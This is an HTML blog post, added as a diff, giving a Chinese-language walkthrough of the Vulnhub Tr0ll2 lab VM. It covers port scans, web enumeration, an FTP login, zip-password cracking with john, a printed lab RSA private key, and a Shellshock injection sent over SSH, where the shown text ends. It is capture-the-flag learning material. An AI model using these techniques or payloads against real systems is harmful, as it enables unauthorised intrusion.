@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub Tr0ll2 - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="信息收集 确定 IP 地址 我的环境特殊，攻击机和靶机并不在同一网段，故无法利用 arp 进行探活，此处利用 nmap 的 sn 选项进行探活: 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.53 Host is up" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/vulnhub-tr0ll2/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub Tr0ll2" />
+<meta property="og:description" content="信息收集 确定 IP 地址 我的环境特殊，攻击机和靶机并不在同一网段，故无法利用 arp 进行探活，此处利用 nmap 的 sn 选项进行探活: 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.53 Host is up" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/vulnhub-tr0ll2/" />
+<meta property="article:published_time" content="2021-06-21T13:25:50+08:00" />
+<meta property="article:modified_time" content="2021-06-21T13:25:50+08:00" />
+<meta itemprop="name" content="Vulnhub Tr0ll2">
+<meta itemprop="description" content="信息收集 确定 IP 地址 我的环境特殊，攻击机和靶机并不在同一网段，故无法利用 arp 进行探活，此处利用 nmap 的 sn 选项进行探活: 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.53 Host is up">
+<meta itemprop="datePublished" content="2021-06-21T13:25:50+08:00" />
+<meta itemprop="dateModified" content="2021-06-21T13:25:50+08:00" />
+<meta itemprop="wordCount" content="2394">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub Tr0ll2"/>
+<meta name="twitter:description" content="信息收集 确定 IP 地址 我的环境特殊，攻击机和靶机并不在同一网段，故无法利用 arp 进行探活，此处利用 nmap 的 sn 选项进行探活: 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.53 Host is up"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Josephine&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Josephine&#39;s Blog</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub Tr0ll2</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-21 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#确定-ip-地址">确定 IP 地址</a></li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#80-端口枚举">80 端口枚举</a>
+          <ul>
+            <li><a href="#21-端口枚举">21 端口枚举</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#获取-initial-shell">获取 Initial Shell</a></li>
+    <li><a href="#提权">提权</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="信息收集">信息收集</h1>
+<h2 id="确定-ip-地址">确定 IP 地址</h2>
+<p>我的环境特殊，攻击机和靶机并不在同一网段，故无法利用 arp 进行探活，此处利用 nmap 的 sn 选项进行探活:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 10.1.1.0/24
+
+Nmap scan report <span class="k">for</span> 10.1.1.53
+Host is up <span class="o">(</span>0.0067s latency<span class="o">)</span>.</code></pre></td></tr></table>
+</div>
+</div>
+<p>可知靶机的 IP 为 <strong>10.1.1.53</strong>。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>首先进行全 TCP 端口的 SYN 扫描，发现开放 TCP 端口 21，22，80：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- -oA tcp_full_port -Pn -n 10.1.1.53
+
+Nmap scan report <span class="k">for</span> 10.1.1.53
+Host is up <span class="o">(</span>0.0056s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</code></pre></td></tr></table>
+</div>
+</div>
+<p>接下来枚举 banner 及服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p21,22,80 -Pn -n -oA 10.1.1.53
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">1024</span> 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 <span class="o">(</span>DSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">2048</span> 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 <span class="o">(</span>ECDSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+Service Info: Host: Tr0ll<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre></td></tr></table>
+</div>
+</div>
+<p>可见，21 端口上运行着 ftp，22 端口上运行着 OpenSSH，80 端口上运行着 Apache。</p>
+<p>最后，顺手扫描常用 20 个 udp 端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sU --top-ports <span class="m">20</span> -sV -sC -Pn -n -oA udp_top_20_ports 10.1.1.33
+
+PORT      STATE         SERVICE      VERSION
+53/udp    open<span class="p">|</span>filtered domain
+67/udp    open<span class="p">|</span>filtered dhcps
+68/udp    open<span class="p">|</span>filtered dhcpc
+69/udp    open<span class="p">|</span>filtered tftp
+123/udp   open<span class="p">|</span>filtered ntp
+135/udp   open<span class="p">|</span>filtered msrpc
+137/udp   open<span class="p">|</span>filtered netbios-ns
+138/udp   open<span class="p">|</span>filtered netbios-dgm
+139/udp   open<span class="p">|</span>filtered netbios-ssn
+161/udp   open<span class="p">|</span>filtered snmp
+162/udp   open<span class="p">|</span>filtered snmptrap
+445/udp   open<span class="p">|</span>filtered microsoft-ds
+500/udp   open<span class="p">|</span>filtered isakmp
+514/udp   open<span class="p">|</span>filtered syslog
+520/udp   open<span class="p">|</span>filtered route
+631/udp   open<span class="p">|</span>filtered ipp
+1434/udp  open<span class="p">|</span>filtered ms-sql-m
+1900/udp  open<span class="p">|</span>filtered upnp
+4500/udp  open<span class="p">|</span>filtered nat-t-ike
+49152/udp open<span class="p">|</span>filtered unknown</code></pre></td></tr></table>
+</div>
+</div>
+<p>并没有额外的发现。</p>
+<h2 id="80-端口枚举">80 端口枚举</h2>
+<p>直接打开浏览器查看页面，主页依旧只有一张图片：</p>
+<p><img src="/images/2021-06-21/index.webp" alt="index"></p>
+<p>查看页面源码，注释中发现疑似用户名 &ldquo;<strong>Tr0ll</strong>&quot;：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;tr0ll_again.jpg&#39;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="c">&lt;!--Nothing here, Try Harder!&gt;
+</span><span class="c">&lt;!--Author: Tr0ll&gt;
+</span><span class="c">&lt;!--Editor: VIM&gt;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>继续访问 <em>http://10.1.1.53/robots.txt</em>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop</code></pre></td></tr></table>
+</div>
+</div>
+<p>使用 <strong>dirb</strong> 来扫描 robots.txt 中的内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">dirb http://10.1.1.53 robots.txt -o tcp_80_dirb_with_robots.txt
+
+---- Scanning URL: http://10.1.1.53/ ----
++ http://10.1.1.53//noob <span class="o">(</span>CODE:301<span class="p">|</span>SIZE:305<span class="o">)</span>                                                                                                        
++ http://10.1.1.53//keep_trying <span class="o">(</span>CODE:301<span class="p">|</span>SIZE:312<span class="o">)</span>                                                                                                 
++ http://10.1.1.53//dont_bother <span class="o">(</span>CODE:301<span class="p">|</span>SIZE:312<span class="o">)</span>                                                                                               
++ http://10.1.1.53//ok_this_is_it <span class="o">(</span>CODE:301<span class="p">|</span>SIZE:314<span class="o">)</span>                                
+-----------------</code></pre></td></tr></table>
+</div>
+</div>
+<p>扫描出来的四个链接，内容均为一张搞怪图片，看起来并无差别，也没有注释：</p>
+<p><img src="/images/2021-06-21/cat_the_troll.webp" alt="cat_the_troll"></p>
+<p>将图片全部下载下来，查看 md5 看有何不同：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">md5sum cat_the_troll.jpg*
+
+8e40e4bf4212b317788de52381072cd8  cat_the_troll.jpg
+f094e16de91dae231812a2fb382d8803  cat_the_troll.jpg.1
+8e40e4bf4212b317788de52381072cd8  cat_the_troll.jpg.2
+8e40e4bf4212b317788de52381072cd8  cat_the_troll.jpg.3</code></pre></td></tr></table>
+</div>
+</div>
+<p>有一张明显不同，既然 <strong>cat the troll</strong>，那就 cat 一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat cat_the_troll.jpg.1</code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-06-21/ctt.webp" alt="ctt"></p>
+<p><strong>y0ur_self</strong>，作为目录访问：</p>
+<p><img src="/images/2021-06-21/y0ur_self.webp" alt="y0ur_self"></p>
+<p>发现文件 <strong>answer.txt</strong>，文件的内容看起来是经过 base64 编码，下载并解码：</p>
+<p><img src="/images/2021-06-21/answer.webp" alt="answer"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">base64 -d answer.txt <span class="p">|</span> less
+
+A
+A
+AA
+AB
+ABM
+AC
+ACTH
+AI
+AIDS
+AM
+AOL
+AOL
+ASCII
+ASL
+ATM
+ATP
+AWOL
+AZ
+AZT
+:</code></pre></td></tr></table>
+</div>
+</div>
+<p>看起来是一个字典，保存为 answer_decode.txt 备用。</p>
+<h3 id="21-端口枚举">21 端口枚举</h3>
+<p>利用刚从注释中取得的用户名，密码与用户名相同，登录到 ftp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ftp 10.1.1.53
+
+Connected to 10.1.1.53.
+<span class="m">220</span> Welcome to Tr0ll FTP... Only noobs stay <span class="k">for</span> a <span class="k">while</span>...
+Name <span class="o">(</span>10.1.1.53:ja<span class="o">)</span>: Tr0ll
+<span class="m">331</span> Please specify the password.
+Password:
+<span class="m">230</span> Login successful.
+Remote system <span class="nb">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp&gt; passive
+Passive mode on.
+ftp&gt; binary
+<span class="m">200</span> Switching to Binary mode.
+ftp&gt; ls
+<span class="m">227</span> Entering Passive Mode <span class="o">(</span>10,1,1,53,165,101<span class="o">)</span>.
+<span class="m">150</span> Here comes the directory listing.
+-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">1474</span> Oct <span class="m">04</span>  <span class="m">2014</span> lmao.zip
+<span class="m">226</span> Directory send OK.</code></pre></td></tr></table>
+</div>
+</div>
+<p>发现有文件 <strong>lmao.zip</strong>，下载至本地，尝试解压但存在密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">7z x lmao.zip
+
+Scanning the drive <span class="k">for</span> archives:
+<span class="m">1</span> file, <span class="m">1474</span> bytes <span class="o">(</span><span class="m">2</span> KiB<span class="o">)</span>
+
+Extracting archive: lmao.zip
+--
+<span class="nv">Path</span> <span class="o">=</span> lmao.zip
+<span class="nv">Type</span> <span class="o">=</span> zip
+Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">1474</span>
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:</code></pre></td></tr></table>
+</div>
+</div>
+<p>刚才的字典派上用场了，先利用 zip2john 从压缩文件中提取 hash，然后利用 john 进行破解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">zip2john lmao.zip &gt; <span class="nb">hash</span> <span class="o">&amp;&amp;</span> john --wordlist<span class="o">=</span>answer_decode.txt <span class="nb">hash</span>
+
+ver 2.0 efh <span class="m">5455</span> efh <span class="m">7875</span> lmao.zip/noob PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>1300, <span class="nv">decmplen</span><span class="o">=</span>1679, <span class="nv">crc</span><span class="o">=</span>70E48BAD
+Using default input encoding: UTF-8
+
+Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
+Will run <span class="m">16</span> OpenMP threads
+Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+ItCantReallyBeThisEasyRightLOL <span class="o">(</span>lmao.zip/noob<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>密码为 <strong>ItCantReallyBeThisEasyRightLOL</strong>，接着解压压缩包得到 noob，该文件明显是一个私钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+-----END RSA PRIVATE KEY-----
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="获取-initial-shell">获取 Initial Shell</h1>
+<p>利用刚取得的私钥，尝试了几个用户名，<strong>noob</strong> 与该私钥对应，但是无法直接登录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh noob@10.1.1.53 -i noob
+
+TRY HARDER LOL!
+Connection to 10.1.1.53 closed.</code></pre></td></tr></table>
+</div>
+</div>
+<p>存在某种限制，尝试使用 ssh -t 参数执行 /bin/sh 进行绕过，无果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh noob@10.1.1.53 -i noob -t /bin/sh
+
+TRY HARDER LOL!
+Connection to 10.1.1.53 closed.</code></pre></td></tr></table>
+</div>
+</div>
+<p>ssh 直接执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh noob@10.1.1.53 -i noob whoami
+
+TRY HARDER LOL!</code></pre></td></tr></table>
+</div>
+</div>
+<p>经过查询，应该是在 authorized_keys 中使用 command 进行了限制。最后尝试 shellshock，可任意执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh noob@10.1.1.53 -i noob <span class="s1">&#39;() { :;}; id&#39;</span>
+
